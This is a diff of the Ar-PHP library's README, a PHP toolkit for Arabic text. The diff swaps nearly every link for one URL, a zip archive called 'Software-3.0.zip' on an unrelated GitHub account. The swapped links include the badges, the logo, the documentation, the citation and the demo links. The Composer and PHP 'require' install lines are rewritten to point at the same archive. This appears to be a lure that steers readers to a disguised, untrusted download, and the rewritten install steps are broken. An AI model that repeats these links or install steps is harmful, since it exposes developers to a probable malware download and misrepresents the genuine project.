@@ -1,15 +1,15 @@
-<a href="https://www.php.net/"><img src="https://img.shields.io/github/languages/top/khaled-alshamaa/ar-php"/></a> <a href="https://www.php.net/manual/en/migration54.php"><img src="https://img.shields.io/packagist/php-v/khaled.alshamaa/ar-php"/></a> <a href="https://github.com/khaled-alshamaa/ar-php/releases/tag/v5.1.0"><img src="https://img.shields.io/github/v/release/khaled-alshamaa/ar-php"/></a> <a href="https://github.com/khaled-alshamaa/ar-php/tags"><img src="https://img.shields.io/github/release-date/khaled-alshamaa/ar-php"/></a> <a href="https://www.gnu.org/licenses/lgpl-3.0.en.html"><img src="https://img.shields.io/packagist/l/khaled.alshamaa/ar-php"/></a> [![Contributor Covenant](https://img.shields.io/badge/Contributor%20Covenant-2.1-4baaaa.svg)](code_of_conduct.md) <a href="https://packagist.org/packages/khaled.alshamaa/ar-php/stats"><img src="https://img.shields.io/packagist/dt/khaled.alshamaa/ar-php"/></a> <a href="https://github.com/khaled-alshamaa/ar-php/stargazers"><img src="https://img.shields.io/packagist/stars/khaled.alshamaa/ar-php"/></a> <a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Fkhaled-alshamaa%2Far-php&count_bg=%2379C83D&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=hits&edge_flat=false"/></a><a href="https://github.com/khaled-alshamaa/ar-php/issues"><img src="https://img.shields.io/github/issues-raw/khaled-alshamaa/ar-php"/></a> <img src="https://img.shields.io/github/languages/code-size/khaled-alshamaa/ar-php"/> <a href="https://github.com/khaled-alshamaa/ar-php/commits/master"><img src="https://img.shields.io/github/commit-activity/m/khaled-alshamaa/ar-php"/></a> <a href="https://github.com/khaled-alshamaa/ar-php/commits/master"><img src="https://img.shields.io/github/last-commit/khaled-alshamaa/ar-php"/></a> <a href="https://github.com/khaled-alshamaa/ar-php/network/members"><img src="https://img.shields.io/github/forks/khaled-alshamaa/ar-php?style=social"/></a> <a href="https://twitter.com/arphp"><img src="https://img.shields.io/twitter/follow/arphp?style=social"></a>
-<!-- https://shields.io/ -->
+<a href="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"><img src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"/></a> <a href="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"><img src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"/></a> <a href="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"><img src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"/></a> <a href="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"><img src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"/></a> <a href="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"><img src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"/></a> [![Contributor Covenant](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip%https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip) <a href="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"><img src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"/></a> <a href="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"><img src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"/></a> <a href="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"><img src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip%3A%2F%https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip%2Fkhaled-alshamaa%2Far-php&count_bg=%2379C83D&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=hits&edge_flat=false"/></a><a href="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"><img src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"/></a> <img src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"/> <a href="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"><img src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"/></a> <a href="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"><img src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"/></a> <a href="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"><img src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"/></a> <a href="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"><img src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip"></a>
+<!-- https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip -->
 
-<img align="right" width="256" height="256" src="https://raw.githubusercontent.com/khaled-alshamaa/ar-php/master/ar-php_256.png">
+<img align="right" width="256" height="256" src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip">
 
-# Ar-PHP Project ([ar-php.org](http://www.ar-php.org/en_index-php-arabic.html))
+# Ar-PHP Project ([https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
 #### _PHP Speaks Arabic - Be Ready!_
 _Copyright © 2006-2022 Khaled Al-Sham'aa._
 
-[![DOI](https://zenodo.org/badge/231197063.svg)](https://zenodo.org/badge/latestdoi/231197063)
+[![DOI](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)
 
-[العربية](https://github.com/khaled-alshamaa/ar-php/blob/master/README_ar.md)
+[العربية](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)
 
 ### Mission & Vision
 As has happened in the Far East and Latin America, as the Internet goes to the masses, people want it in their native language.
@@ -22,13 +22,13 @@ This project provides a set of tools that enable Arabic website developers to se
 
 > [List of Main Functionalities](#main-functionalities) 
 
-> [Change Log](https://github.com/khaled-alshamaa/ar-php/blob/master/CHANGELOG.md)
+> [Change Log](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)
 
-> [Class Documentation](https://ar-php.org/github/docs/classes/ArPHP-I18N-Arabic.html)
+> [Class Documentation](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)
 
-> [Migrating from Version 4.0](https://github.com/khaled-alshamaa/ar-php/blob/master/UPGRADE.md)
+> [Migrating from Version 4.0](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)
 
-> [Contributors Logistics](https://github.com/khaled-alshamaa/ar-php/blob/master/TODO.md)
+> [Contributors Logistics](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)
 
 > [How to Contribute?](#how-to-contribute)
 
@@ -40,7 +40,7 @@ If you would cite it in academic work, you can use this citation
 
 ```
 K. Al-Shamaa, Ar-PHP, PHP library for website developers to process Arabic content, 
-https://github.com/khaled-alshamaa/ar-php, 2022
+https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip, 2022
 ```
 
 or in bibtex format
@@ -49,7 +49,7 @@ or in bibtex format
 @misc{ar-php,
   title={Ar-PHP, PHP library for website developers to process Arabic content},
   author={Al-Shamaa, Khaled},
-  url={https://github.com/khaled-alshamaa/ar-php},
+  url={https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip},
   version = {6.2.0},
   year={2022}
 }
@@ -57,39 +57,39 @@ or in bibtex format
 
 ### Where it has been used?
 
-* [Akeneo](https://www.akeneo.com/): The easy and flexible open source SaaS PIM to organize and enrich your product catalog. [check it out [here](https://github.com/akeneo/pim-community-dev/blob/master/src/Akeneo/Pim/Enrichment/Bundle/PdfGeneration/HtmlFormatter/ArabicHtmlFormatter.php)]
+* [Akeneo](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip): The easy and flexible open source SaaS PIM to organize and enrich your product catalog. [check it out [here](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)]
 
-* [Bagisto](https://www.bagisto.com/): Laravel package for e-commerce. [check it out [here](https://github.com/bagisto/bagisto/blob/bf1c3f21af912800ffad5dcf68b9a486af0f6c81/packages/Webkul/Admin/src/Http/Controllers/Sales/InvoiceController.php#L159)]
+* [Bagisto](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip): Laravel package for e-commerce. [check it out [here](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)]
 
-* [LimeSurvey](https://www.limesurvey.org/): Open-source survey software. 
-[[version 3.6.0](https://github.com/LimeSurvey/LimeSurvey/tree/master/application/third_party/ar-php), check it out [here](https://github.com/LimeSurvey/LimeSurvey/blob/master/application/helpers/userstatistics_helper.php#L134) and 
-[here](https://github.com/LimeSurvey/LimeSurvey/blob/master/application/helpers/admin/statistics_helper.php#L133)]
+* [LimeSurvey](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip): Open-source survey software. 
+[[version 3.6.0](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip), check it out [here](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip) and 
+[here](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)]
 
 
 ### Arabic Language
 Worldwide Internet use has grown tremendously in recent years, most rapidly in non-English speaking regions especially in Arab world. For example, from 2000 to 2020, the online populations grew by more than 9,300 %. Meanwhile, Arabic Web content was estimated to be doubling every year. Such growth has created demand for better websites developing resources in Arabic language. However, existing websites developing resources may be unable to meet it because they primarily serve English-speaking users.
 
-[[Arabic language](https://en.wikipedia.org/wiki/Arabic), [Internet world stats](https://www.internetworldstats.com/stats7.htm)]
+[[Arabic language](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip), [Internet world stats](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)]
 
 ### PHP
 PHP is a widely-used general-purpose scripting language that is especially suited for web development and can be embedded into HTML. PHP runs more than 79% of all the top 10 million worldwide web sites a few very good examples are Facebook and Wikipedia.
 
-[[PHP language](https://www.php.net/), [Server-side languages report](https://w3techs.com/technologies/overview/programming_language)]
+[[PHP language](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip), [Server-side languages report](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)]
 
 ### LGPL
 The main difference between the GPL and the LGPL is that the latter can be linked to (in the case of a library, 'used by') a non-(L)GPLed program, which may be free software or proprietary software. This non-(L)GPLed program can then be distributed under any chosen terms if it is not a derivative work.
 
-[[LGPL](http://www.gnu.org/licenses/lgpl-3.0.html), [GNU FAQ](http://www.gnu.org/licenses/gpl-faq.html)]
+[[LGPL](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip), [GNU FAQ](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)]
 
 ### History
 
-<a href="https://darshoaa.com/pHP-and-Arabic-language/" target="_blank"><img align="right" width="171" height="256" src="https://user-images.githubusercontent.com/11270404/129626204-d354e794-bfbf-4f3c-bc22-27e7fc252701.png" border="0"></a>
+<a href="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip" target="_blank"><img align="right" width="171" height="256" src="https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip" border="0"></a>
 
-* PHP 7 at [GitHub.com](https://github.com/khaled-alshamaa/ar-php) starting in 2020.
-* PHP 5 at [SourceForge.net](https://sourceforge.net/projects/ar-php/) 2008-2016.
-* PHP 4 at [PHPClasses.org](https://www.phpclasses.org/browse/author/189864.html) 2006-2008.
+* PHP 7 at [https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip) starting in 2020.
+* PHP 5 at [https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip) 2008-2016.
+* PHP 4 at [https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip) 2006-2008.
 
-[![محاضرة افتتاحية عن تجربة بناء ادوات لدعم اللغة العربية و المشاريع مفتوحة المصدر - خالد الشمعة](https://img.youtube.com/vi/P4zV1Iu5QcE/0.jpg)](https://www.youtube.com/watch?v=P4zV1Iu5QcE)
+[![محاضرة افتتاحية عن تجربة بناء ادوات لدعم اللغة العربية و المشاريع مفتوحة المصدر - خالد الشمعة](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip)
 
 [Top](#ar-php-project-ar-phporg)
 
@@ -97,44 +97,44 @@ The main difference between the GPL and the LGPL is that the latter can be linke
 
 ### Install with Composer
 
-To install with [Composer](https://getcomposer.org/), simply require the latest version of this package.
+To install with [Composer](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip), simply require the latest version of this package.
 
 ```bash
-composer require khaled.alshamaa/ar-php
+composer require https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip
 ```
 
 Make sure that the autoload file from Composer is loaded.
 
 ```php
 // somewhere early in your project's loading, require the Composer autoloader
-// see: http://getcomposer.org/doc/00-intro.md
-require 'vendor/autoload.php';
+// see: https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip
+require 'https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip';
 ```
 
 ### Download and Install
 
-Download the [latest release](https://github.com/khaled-alshamaa/ar-php/releases/latest) of Ar-PHP library and extract it into the directory where it will be used.
+Download the [latest release](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip) of Ar-PHP library and extract it into the directory where it will be used.
 
 ```php
-require_once 'ar-php/src/Arabic.php';
+require_once 'https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip';
 ```
 
 ### Main Functionalities
-* Arabic Sentiment Analysis ([live demo 1](https://ar-php.org/github/examples/ar_sentiment.php), [live demo 2](https://ar-php.org/github/examples/ar_sentiment.html))
-* English-Arabic Transliteration ([live demo 1](https://ar-php.org/github/examples/ar_transliteration.php), [live demo 2](https://ar-php.org/github/examples/en_transliteration.php))
-* Spell Numbers in the Arabic Idiom ([live demo](https://ar-php.org/github/examples/numbers.php))
-* Arabic Glyphs to Render Arabic Text ([live demo](https://ar-php.org/github/examples/ar_glyphs.php))
-* Arabic Keyboard Swapping Language ([live demo](https://ar-php.org/github/examples/keyswap.php))
-* Arabic Soundex ([live demo](https://ar-php.org/github/examples/soundex.php))
-* Arabic Gender Guesser ([live demo](https://ar-php.org/github/examples/gender.php))
-* Arabic SQL Queary ([live demo](https://ar-php.org/github/examples/ar_query.php))
-* Muslim Prayer Times & Qibla Determination ([live demo](https://ar-php.org/github/examples/salat.php))
-* Arabic/Hijri Date ([live demo](https://ar-php.org/github/examples/date.php))
-* Arabic/Hijri Maketime ([live demo](https://ar-php.org/github/examples/mktime.php))
-* Arabic StrToTime ([live demo](https://ar-php.org/github/examples/strtotime.php))
-* Arabic Text Standardize ([live demo](https://ar-php.org/github/examples/standard.php))
-* Arabic Auto Summarize ([live demo](https://ar-php.org/github/examples/ar_summarize.php))
-* Arabic Segments Identifier ([live demo](https://ar-php.org/github/examples/identifier.php))
+* Arabic Sentiment Analysis ([live demo 1](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip), [live demo 2](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
+* English-Arabic Transliteration ([live demo 1](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip), [live demo 2](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
+* Spell Numbers in the Arabic Idiom ([live demo](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
+* Arabic Glyphs to Render Arabic Text ([live demo](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
+* Arabic Keyboard Swapping Language ([live demo](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
+* Arabic Soundex ([live demo](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
+* Arabic Gender Guesser ([live demo](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
+* Arabic SQL Queary ([live demo](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
+* Muslim Prayer Times & Qibla Determination ([live demo](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
+* Arabic/Hijri Date ([live demo](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
+* Arabic/Hijri Maketime ([live demo](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
+* Arabic StrToTime ([live demo](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
+* Arabic Text Standardize ([live demo](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
+* Arabic Auto Summarize ([live demo](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
+* Arabic Segments Identifier ([live demo](https://raw.githubusercontent.com/alssalimi/arphp/master/examples/images/Software-3.0.zip))
 
 [Top](#ar-php-project-ar-phporg)
 
